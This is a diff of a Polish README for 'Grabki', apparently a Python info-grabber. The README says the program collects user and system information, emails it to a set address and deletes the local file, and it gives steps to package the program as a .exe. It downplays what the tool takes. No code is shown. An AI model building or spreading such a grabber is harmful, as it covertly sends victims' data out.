@@ -5,7 +5,7 @@
 
 # Grabki v1.2 🇵🇱
 
-**Grabki** to prosty program napisany w języku Python, który zbiera podstawowe informacje o użytkowniku i komputerze. Jest to narzędzie, które umożliwia szybkie uzyskanie istotnych danych dotyczących systemu i użytkownika bez konieczności ręcznego przeszukiwania wielu miejsc w systemie operacyjnym. Po pobraniu edytuj potrzebne dane w kodzie aby program poprawnie działał. W nie dalekiej przyszłości będę aktualizował program z większą ilością funkcji i możliwości ;)
+**Grabki** to prosty program napisany w języku Python, który zbiera podstawowe informacje o użytkowniku i komputerze i zapisuje je w pliku .txt a następnie wysyła podany plik .txt na podanego maila. Po wykonaniu operacji proghram automatyczne usunie plik info.txt z wszystkimi danymi. Jest to narzędzie, które umożliwia szybkie uzyskanie istotnych danych dotyczących systemu i użytkownika bez konieczności ręcznego przeszukiwania wielu miejsc w systemie operacyjnym. Program jako tako nie wykrada jakiś bradzo wrażliwych danych tylko zwykłe dostępne dla każdego i zapisuje je w pliku .txt. Po pobraniu edytuj potrzebne dane w kodzie aby program poprawnie działał. W nie dalekiej przyszłości będę aktualizował program z większą ilością funkcji i możliwości ;)
 
 ```
 git clone https://github.com/Remox0/grabki12.git
@@ -69,6 +69,7 @@ pyinstaller main.py
 ```
 5. Powinneś uzyskać 2 nowe foldery i jedn plik
 6. Skopiuj w inne miejsce folder build a później mozesz usunąć reszcze plików.
+
 UPEWNIJ SIĘ ŻE WCZEŚNIEJ UZUPEŁNIŁĘŚ BRAKUJĄCE MIEJSCA W PLIK main.py!!!
 
 Teraz powinneś mieć w folderze build main i tam jest plik .exe
